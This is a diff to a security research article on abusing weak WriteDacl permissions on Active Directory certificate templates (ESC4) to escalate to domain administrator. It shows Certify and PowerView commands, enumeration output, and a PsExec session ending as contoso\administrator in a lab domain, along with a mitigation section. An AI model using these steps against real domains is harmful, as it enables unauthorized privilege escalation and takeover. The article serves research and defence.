@@ -1,9 +1,29 @@
 # Abusing Weak ACL on Certificate Templates
+
+## Table of Contents
++ [Abstract](#abstract)
++ [Vulnerable Template Setting](#vulnerable-template-setting)
++ [Enumerating Certificate Template Objects](#enumerating-certificate-template-objects)
++ [Exploitable Domain Object Attributes for Domain Escalation](#exploitable-domain-object-attributes-for-domain-escalation)
++ [Abusing WriteDacl ACE](#abusing-writedacl-ace)
+  + [Procedure](#procedure)
+  + [Getting Enrollment Right](#getting-enrollment-right)
+  + [Disabling Manager Approval Requirement](#disabling-manager-approval-requirement)
+  + [Disabling Authorized Signature Requirement](#disabling-authorized-signature-requirement)
+  + [Enabling SAN Specification](#enabling-san-specification)
+  + [Editting Certificate Application Policy Extension](#editting-certificate-application-policy-extension)
+  + [Domain Escalation](#domain-escalation)
++ [Mitigation](#mitigation)
++ [Conclusion](#conclusion)
++ [Acknowledgments](#acknowledgments)
+
+
 ## Abstract
 At Black Hat USA 2021, Will Schroeder ([@harmj0y](https://twitter.com/harmj0y)) and Lee Christensen ([@tifkin_](https://twitter.com/tifkin_)) presented about attack surface in Active Directory Certificate Services (["Certified Pre-Owned: Abusing Active Directory Certificate Services"](https://posts.specterops.io/certified-pre-owned-d95910965cd2)). 
 There are many technical details in the [whitepaper](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf). 
 The whitepaper mentioned that a certificate template with weak ACL can lead to domain escalation, but there is no technical detail about the procedure.
 Therefore, I summarized my investigation about certificate templates with weak ACL in this article.
+
 
 ## Vulnerable Template Setting
 As mentioned earlier, a certificate template with weak ACL can lead to domain escalation.
@@ -233,6 +253,7 @@ Certify completed in 00:00:00.3047464
 C:\Tools>
 ```
 
+
 ## Exploitable Domain Object Attributes for Domain Escalation
 Using PowerView, we can enumerate vulnerable template object attributes as follows:
 
@@ -305,7 +326,9 @@ The following figures show the relationship between attributes and menus:
 ![attributes-3](./figures/attributes3.png)
 
 
+
 ## Abusing WriteDacl ACE
+
 ### Procedure
 For domain escalation, follow the following steps to abuse WriteDacl:
 
@@ -325,7 +348,6 @@ Shouldn't we edit `pkiextendedkeyusage` attribute and `mspki-ra-application-poli
 As far as I tested, it is not required.
 This is because if the `mspki-certificate-application-policy`, `pkiextendedkeyusage` and `mspki-ra-application-policies` do not match, then `mspki-certificate-application-policy` takes precedence in the use of the certificate.　
 Therefore, for Domain Escalation, you only need to edit `mspki-certificate-application-policy` to abuse vulnerable certificate in this case.
-
 
 ### Getting Enrollment Right
 Now we only have WriteDacl for ESC4 template and cannot enroll the template.
@@ -398,7 +420,6 @@ C:\Tools>Certify.exe find /vulnerable
 
 Now we got enrollment rights for the vulnerable certificate.
 
-
 ### Disabling Manager Approval Requirement
 There is one more obstacle to issuing the certificate.
 To get a certificate with the target template passively, we need to disable Manager Approval requirement.
@@ -450,7 +471,6 @@ C:\Tools>Certify.exe find /vulnerable
 
 There is no `PEND_ALL_REQUESTS` in `mspki-enrollment-flag`.
 Now we can issue certificates using the ESC4 template without Manager Approval.
-
 
 ### Disabling Authorized Signature Requirement
 Authorized Signature requirement blocks unauthorized certificate issuance.
@@ -610,7 +630,7 @@ C:\Tools>Certify.exe find /vulnerable
 ```
 
 In the output of `Certify.exe`, `pkiextendedkeyusage` and "Application Policies" (`mspki-ra-application-policies`) remain "Encrypting File System", but no problem.
-As mentioned earlier, `mspki-certificate-application-policy` takes precedence over `pkiextendedkeyusage` and `mspki-ra-application-policies`, but `mspki-certificate-application-policy` attribute is not displayed in outputs of `Certify.exe`.
+As mentioned earlier, `mspki-certificate-application-policy` takes precedence over `pkiextendedkeyusage` and `mspki-ra-application-policies`, but `mspki-certificate-application-policy` attribute is not displayed in outputs of `Certify.exe` released at the time of this writing.
 To confirm the result, we can use `Get-DomainObject` function in PowerView or `DirectoryServices.DirectorySearcher` object with PowerShell:
 
 ```
@@ -657,6 +677,37 @@ mspki-ra-application-policies        : 1.3.6.1.4.1.311.10.3.4
 
 PS C:\Tools>
 ```
+
+> __UPDATE__: After I wrote this article, I sent [a pull request](https://github.com/GhostPack/Certify/pull/8) to the GitHub repository for `Certify.exe`. 
+> Lee Christensen ([@tifkin_](https://twitter.com/tifkin_)) merged my pull request and made some update.
+> Now we can confirm `mspki-certificate-application-policy` attribute with `Certify.exe` as follows:
+> 
+> ```
+> C:\Tools>Certify.exe find /vulnerable
+> 
+> --snip--
+> 
+> [!] Vulnerable Certificates Templates :
+> 
+>     CA Name                               : CA01.contoso.local\contoso-CA01-CA
+>     Template Name                         : ESC4
+>     Schema Version                        : 2
+>     Validity Period                       : 1 year
+>     Renewal Period                        : 6 weeks
+>     msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT, SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
+>     mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+>     Authorized Signatures Required        : 0
+>     Application Policies                  : Encrypting File System
+>     pkiextendedkeyusage                   : Encrypting File System
+>     mspki-certificate-application-policy  : Client Authentication
+>     Permissions
+>       Enrollment Permissions
+>         Enrollment Rights           : CONTOSO\Domain Admins         S-1-5-21-3654360273-254804765-2004310818-512
+>                                       CONTOSO\Domain Users          S-1-5-21-3654360273-254804765-2004310818-513
+>                                       CONTOSO\Enterprise Admins     S-1-5-21-3654360273-254804765-2004310818-519
+> 
+> --snip--
+> ```
 
 ### Domain Escalation
 Now we can issue authentication purpose certificates with high privileged domain account by using the ESC4 certificate template.
@@ -784,6 +835,15 @@ Certificate Extensions: 10
 Finally, we perform PKINIT Kerberos authentication and Pass-the-Ticket attack with the generated pfx file:
 
 ```
+C:\Tools>whoami /user
+
+USER INFORMATION
+----------------
+
+User Name     SID
+============= =============================================
+contoso\david S-1-5-21-3654360273-254804765-2004310818-1104
+
 C:\Tools>dir \\dc01.contoso.local\C$
 Access is denied.
 
@@ -895,6 +955,15 @@ C:\Tools>
 Now we achieved domain escalation by abusing WriteDacl for a certificate template:
 
 ```
+C:\Tools>whoami /user
+
+USER INFORMATION
+----------------
+
+User Name     SID
+============= =============================================
+contoso\david S-1-5-21-3654360273-254804765-2004310818-1104
+
 C:\Tools>PsExec64.exe -accepteula \\dc01.contoso.local cmd.exe
 
 PsExec v2.34 - Execute processes remotely
@@ -919,7 +988,6 @@ contoso\administrator S-1-5-21-3654360273-254804765-2004310818-500
 
 C:\Windows\system32>
 ```
-
 
 ## Mitigation
 This attack method could be mitigated by restricting the assignment of WriteDacl permissions to certificate template objects.
